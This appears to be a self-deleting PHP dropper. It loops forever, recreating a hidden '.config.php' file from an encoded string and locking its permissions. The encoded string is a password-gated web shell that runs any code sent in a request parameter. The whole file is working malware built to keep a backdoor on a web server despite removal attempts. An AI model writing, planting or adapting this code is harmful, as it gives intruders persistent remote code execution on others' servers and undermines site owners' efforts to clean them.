<?php
set_time_limit(0);
ignore_user_abort(true);
@unlink(__FILE__);
$file = '.config.php';
$shell='PD9waHAKJGsgPSBpc3NldCgkX1JFUVVFU1RbMF0pPyRfUkVRVUVTVFswXTonJzsKaWYgKG1kNSgkaykgPT09ICc5M2FlOTRhZTA1ZTk4MGUxMGM5ZmFiOGJlOGNmMTFiMycpewokYSA9ICRfUkVRVUVTVFsxXTsKJGIgPSBudWxsOwpldmFsKCRiLiRhLiRiKTsKfQo/Pg==';
while(true){
    file_put_contents($file, base64_decode($shell));
    @system("chmod 600 .config.php");
    usleep(500);
}
?>
